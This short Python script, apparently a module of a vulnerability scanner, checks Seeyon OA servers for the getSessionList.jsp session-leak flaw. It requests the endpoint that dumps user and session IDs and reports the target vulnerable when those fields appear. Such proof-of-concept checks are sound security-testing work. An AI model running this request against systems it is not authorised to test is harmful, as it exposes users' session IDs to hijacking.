#!/usr/bin/env python
# coding=utf-8
# 致远OAgetSessionList.jspSession泄漏漏洞
import requests, threading
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''


def pscan_vuln(url):
    urls = url
    global results
    try:
        response = requests.get(url=url + '/yyoa/ext/https/getSessionList.jsp?cmd=getAll', verify=False, timeout=20)
        bm = response.encoding  # 获取网页编码
        response.encoding = str(bm)  # 设置网页编码
        if response.status_code == 200 and "usrID" in response.text and "sessionID" in response.text:
            print(colored('[+]存在致远OASession泄漏漏洞', 'red'))
            results = f'{urls}-->存在致远OASession泄漏漏洞'
        else:
            print('[-]不存在致远OASession泄漏漏洞')
    except:
        print('[-]不存在致远OASession泄漏漏洞')


def zhiyuanOAsession(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results
